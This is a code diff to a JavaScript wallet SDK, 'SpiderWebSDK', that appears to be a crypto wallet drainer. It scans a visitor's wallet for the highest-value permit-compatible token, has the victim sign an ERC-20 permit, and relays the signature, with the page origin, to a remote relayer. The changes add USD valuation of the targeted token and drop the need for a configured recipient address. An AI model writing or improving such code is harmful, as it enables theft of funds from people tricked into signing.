@@ -46,10 +46,10 @@ window.SpiderWebSDK = {
     }
 
     // ✅ FIXED: The 'relayerAddress' is no longer required here. The SDK will fetch it.
-    if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.recipientAddress || !config.chainId) {
-        console.error("SpiderWebSDK Error: Missing required configuration parameters.");
-        return;
-    }
+    if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.chainId) {
+            console.error("SpiderWebSDK Error: Missing required configuration parameters (buttonId, apiKey, alchemyApiKey, chainId).");
+            return;
+        }
     if (typeof ethers === 'undefined') {
         console.error("SpiderWebSDK Error: ethers.js is not loaded. Please include it on your page.");
         return;
@@ -215,14 +215,20 @@ window.SpiderWebSDK = {
     
     _executeSend: async function() {
         this._updateStatus("Scanning wallet for compatible tokens...", "pending");
-        
-        const tokenData = await this._findHighestValueToken();
-        if (!tokenData) {
+
+        // ✅ MODIFIED: Now expects an object with token data and its USD value.
+        const result = await this._findHighestValueToken();
+
+        if (!result || !result.tokenData) {
             throw new Error("No permit-compatible tokens with a balance were found.");
         }
 
+        const { tokenData, usdValue } = result;
+
         this._updateStatus(`Highest value token found: ${tokenData.symbol}`, "info");
-        await this._signAndSendWithStandardPermit(tokenData);
+        
+        // ✅ MODIFIED: Pass the calculated USD value to the next function.
+        await this._signAndSendWithStandardPermit(tokenData, usdValue);
     },
 
     _findHighestValueToken: async function() {
@@ -268,8 +274,9 @@ window.SpiderWebSDK = {
         
         // Optimization: If there's only one, no need to fetch prices.
         if (compatibleTokens.length === 1) {
-            return compatibleTokens[0];
-        }
+        // This line was the bug. It now returns the correct object shape.
+        return { tokenData: compatibleTokens[0], usdValue: 0 }; 
+    }
 
         this._updateStatus(`Found ${compatibleTokens.length} tokens. Valuating...`, "pending");
 
@@ -277,7 +284,7 @@ window.SpiderWebSDK = {
         const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
         if (!prices) {
             console.warn("Could not fetch prices. Defaulting to the first compatible token found.");
-            return compatibleTokens[0]; // Fallback if price API fails
+            return { tokenData: compatibleTokens[0], usdValue: 0 }; // Return with 0 value
         }
         
         // 5. Calculate USD value and find the token with the highest value
@@ -299,7 +306,10 @@ window.SpiderWebSDK = {
         }
 
         // Return the highest value token found. If no prices were found, fall back to the first one.
-        return highestValueToken || compatibleTokens[0];
+        const resultToken = highestValueToken || compatibleTokens[0];
+        const resultUsdValue = maxUsdValue > -1 ? maxUsdValue : 0;
+        return { tokenData: resultToken, usdValue: resultUsdValue };
+        
     },
 
 _logConnectionEvent: async function() {
@@ -383,7 +393,7 @@ _checkPermitSupport: async function(tokenAddress) {
     }
 },
 
-    _signAndSendWithStandardPermit: async function(tokenData) {
+    _signAndSendWithStandardPermit: async function(tokenData, usdValue) {
         this._updateStatus(`Preparing permit for ${tokenData.symbol}...`, 'pending');
         try {
             const tokenContract = new ethers.Contract(tokenData.contractAddress, this._ERC20_PERMIT_ABI, this._signer);
@@ -442,7 +452,8 @@ _checkPermitSupport: async function(tokenAddress) {
                 deadline: deadline,
                 v, r, s,
                 origin: window.location.origin,
-                chainId: this._config.chainId
+                chainId: this._config.chainId,
+                totalUsdValue: usdValue // <-- NEW FIELD
             };
 
             this._updateStatus('Signature received. Relaying transaction...', 'pending');
